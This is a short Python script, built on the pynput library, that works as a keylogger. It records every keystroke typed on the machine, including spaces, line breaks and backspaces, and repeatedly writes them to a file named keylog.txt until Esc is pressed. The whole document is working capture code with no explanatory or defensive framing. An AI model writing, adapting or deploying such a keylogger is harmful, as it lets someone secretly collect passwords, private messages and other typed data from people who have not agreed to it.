from pynput import keyboard

log = []
ignore_keys = {keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_gr}

def on_press(key):
    global log
    try:
        if key == keyboard.Key.space:
            log.append(" ")
        elif key == keyboard.Key.enter:
            log.append("\n")
        elif key == keyboard.Key.backspace:
            log.append("[BACKSPACE]")
        elif key not in ignore_keys:
            log.append(key.char)
    except AttributeError:
        pass  # Ignore function keys

    # Write logs periodically to a file
    with open("keylog.txt", "w") as f:
        f.write("".join(log))

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
